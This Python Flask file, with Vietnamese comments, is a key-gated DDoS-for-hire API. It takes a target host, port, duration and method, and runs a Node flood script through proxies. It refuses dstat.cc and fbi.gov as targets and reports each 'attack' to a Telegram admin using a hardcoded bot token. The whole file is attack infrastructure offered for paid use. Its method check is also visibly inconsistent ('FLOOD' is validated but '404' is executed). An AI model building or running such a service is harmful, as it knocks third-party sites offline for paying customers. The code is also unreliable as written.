from flask import Flask, request, jsonify
import subprocess
import threading
import datetime
import telebot
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

USER_FILE_PATH = 'user.txt'

# Thông tin cấu hình của bot Telegram
TELEGRAM_API_TOKEN = '6308893193:AAFnXnDiy-gX7VizVBGjRG_EimEjTDS-npU'
ADMIN_CHAT_ID = '5805939083'

# Khởi tạo bot Telegram
bot = telebot.TeleBot(TELEGRAM_API_TOKEN)

# Sử dụng ThreadPoolExecutor để quản lý việc thực hiện các tác vụ trong luồng
executor = ThreadPoolExecutor(max_workers=10)

def read_user_file(file_path):
    user_data = {}
    try:
        with open(file_path, 'r') as file:
            for line in file:
                key, expiration_date = line.strip().split(':')
                user_data[key] = expiration_date
    except FileNotFoundError:
        print(f"Khong tim thay file: {file_path}")
    return user_data

def validate_api_key(key):
    user_data = read_user_file(USER_FILE_PATH)
    
    if key in user_data:
        expiration_date = user_data[key]
        current_date = datetime.datetime.now().strftime('%Y-%m-%d')
        
        if current_date <= expiration_date:
            return True, expiration_date
        else:
            print(f"API key het han: {key}")
    else:
        print(f"API key khong hop le: {key}")

    return False, None

def authenticate_key(func):
    def wrapper(*args, **kwargs):
        key = request.args.get("key")
        is_valid, key_info = validate_api_key(key)
        if not is_valid:
            send_telegram_error_notification(f"Invalid API key: {key}")
            return jsonify({"error": "Invalid API key"}), 403
        return func(*args, key_info=key_info, **kwargs)
    return wrapper

def send_telegram_message(message):
    try:
        bot.send_message(ADMIN_CHAT_ID, message)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

def send_telegram_success_notification(key_info, host, time, port, methods):
    message = f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}\nStatus: Success"
    send_telegram_message(message)

def send_telegram_error_notification(message):
    message = f"Error: {message}"
    send_telegram_message(message)

@app.route('/api', methods=['GET'])
@authenticate_key
def execute_tool(key_info):
    try:
        methods = request.args.get('methods', '')
        host = request.args.get('host', '')
        time = request.args.get('time', '')
        port = request.args.get('port', '')

        invalid_host = ["dstat.cc", "https://dstat.cc", "https://dstat.cc/", "https://www.fbi.gov/", "www.fbi.gov", "fbi.gov", "https://www.fbi.gov"]
        if host in invalid_host:
            send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: Invalid host")
            return jsonify({"Status": "error", "Noti": "Playing stupid, kid"}), 400

        if not (methods and host and time and port):
            send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: Incomplete information")
            return jsonify({"Status": "error", "Noti": "Please enter complete information"}), 400

        valid_methods = ["FLOOD", "STOP"]
        if methods not in valid_methods:
            send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: Method does not exist or is missing")
            return jsonify({"Status": "error", "Noti": "Method does not exist or is missing, please re-enter"}), 400

        if int(time) > 60:
            send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: Time limit exceeded")
            return jsonify({"Status": "error", "Noti": "time max 60s"}), 400

        def execute_command():
            try:
                if methods == "404":
                    command = ['node', 'http-tiger.js', host, time, '64', '5', 'proxy.txt']
                elif methods == "STOP":
                    command = ['pkill', '-f', host]
                else:
                    send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: Undefined method")
                    print(f"Methods khong xac dinh: {methods}")
                    return

                result = subprocess.run(command, capture_output=True, text=True, timeout=int(time))
                print(result.stdout)
                print(result.stderr)
            except subprocess.TimeoutExpired:
                send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: Attack timed out")
                print("Het thoi gian tan cong.")
            except Exception as e:
                send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: {str(e)}")
                print(f"Loi khi thuc thi lenh: {e}")

        threading.Thread(target=execute_command).start()

        result = {
            'Status': 'Success',
            'time': time,
            'host': host,
            'Methods': methods,
            'Port': port,
            'Owner': 'Van_trong',
            'key': key_info
        }

        send_telegram_success_notification(key_info, host, time, port, methods)
        return jsonify(result)
    except Exception as e:
        print(e)
        send_telegram_error_notification(f"Attack on Key: {key_info}\n- Host {host}\n- Port: {port}\n- Time: {time}\n- Methods: {methods}.\nError: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2024, debug=True)
